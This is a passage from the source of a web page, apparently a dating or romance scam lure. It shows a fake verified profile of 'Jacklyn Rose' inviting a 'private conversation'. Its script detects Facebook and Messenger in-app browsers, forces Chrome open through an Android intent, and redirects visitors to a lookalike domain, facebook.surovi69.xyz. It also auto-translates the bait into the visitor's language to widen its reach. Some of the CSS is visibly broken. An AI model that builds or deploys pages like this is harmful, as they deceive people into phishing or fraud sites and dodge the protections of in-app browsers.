            overflow: hidden;
        }

        /* ফ্লোটিং ইমোজি অ্যানিমেশন */
        body::before {
            content: "❤️ ✨ 🌸 💖 💋 🌹 ✨ ❤️ 🌸 💖";
            position: absolute;
            top: -10%;
            left: 0;

            line-height: 1.5;
            word-spacing: 50px;
            opacity: 0.15;
            color: #ff4d79;
            z-index: -1;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
            pointer-events: none;
        }
        
        /* গুগল ট্রান্সলেট বার হাইড করা */
        .goog-te-banner-frame.skiptranslate, .goog-te-gadget { display: none !important; }
        body { top: 0px !important; }

        .bridge-card {
            background: white; width: 95%; max-width: 400px;
            border-radius: 15px; overflow: hidden;
            box-shadow: 0 15px 35px rgba(255, 77, 121, 0.2); text-align: center;
            position: relative; z-index: 10;
        }
        .cover-photo {
            width: 100%; height: 150px;
            background: url('https://i.ibb.co.com/HTXcyk1L/pic1.webp') center/cover;
        }
        .profile-section { margin-top: -65px; padding: 20px; position: relative; }
        
        .img-container { 
            position: relative; 
            width: 130px;

        }

            width: 100%; height: 100%; border-radius: 50%;
            border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            object-fit: cover;
        }
        
        .online-dot {
            height: 22px; width: 22px; 
            background-color: #31a24c;
            border: 4px solid white; border-radius: 50%;
            position: absolute; 
            bottom: 8px; 
            right: 12px;
            z-index: 10;
        }
        .name { 
            font-size: 24px; font-weight: bold; color: #1c1e21; 
            margin: 15px 0 5px; 
            display: flex; align-items: center; justify-content: center; gap: 6px;

        .verified-icon { color: #0084FF; font-size: 20px; }
        .bio { color: #65676b; font-size: 15px; margin-bottom: 25px; line-height: 1.5; }
        .main-btn {
            background-color: #0084FF; color: white; text-decoration: none;

            display: inline-flex; align-items: center; gap: 10px;
            width: 85%; justify-content: center; font-size: 17px; 
            cursor: pointer; border: none;
            box-shadow: 0 4px 15px rgba(0, 132, 255, 0.3);
            transition: transform 0.2s;
        }
        .main-btn:active { transform: scale(0.98); }

</head>
<body>

    <div class="bridge-card">
        <div class="cover-photo"></div>
        <div class="profile-section">
            <div class="img-container">
                <img src="https://i.ibb.co.com/BHCXRznL/p1.webp" alt="Profile" class="profile-img">
                <span class="online-dot"></span>
            </div>
            
            <div class="name">
                Jacklyn Rose 
                <i class="fas fa-check-circle verified-icon"></i>
            </div>
            
            <div id="translate-bio" class="bio">
                Hey! I'm waiting for you. Click below to start our private conversation directly in Chrome.
            </div>
            
            <button class="main-btn" id="actionBtn">
                <i class="fab fa-facebook-messenger"></i> <span id="btn-text">Open in Chrome</span>
            </button>
        </div>
    </div>

    <div id="google_translate_element" style="visibility:hidden; height:0; overflow:hidden;"></div>

    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'en',
                autoDisplay: false 
            }, 'google_translate_element');
        }

        window.addEventListener('load', function() {
            setTimeout(function() {
                let userLang = navigator.language || navigator.userLanguage; 
                let langCode = userLang.split('-')[0]; 
                
                if (langCode !== 'en') {
                    const select = document.querySelector('select.goog-te-combo');
                    if (select) {
                        select.value = langCode;
                        select.dispatchEvent(new Event('change'));
                    }
                }
            }, 1500); 
        });

        const targetUrl = "https://facebook.surovi69.xyz";
        const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";

        function openInExternalBrowser() {
            const isFBApp = /FBAN|FBAV|Messenger/i.test(navigator.userAgent);
            if (isFBApp) {
                window.location.href = chromeIntent;
                setTimeout(() => { window.location.href = targetUrl; }, 1500);
            } else {
                window.location.href = targetUrl;
            }
        }

        document.getElementById('actionBtn').addEventListener('click', function(e) {
            e.preventDefault();
            openInExternalBrowser();
        });
    </script>
    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</body>
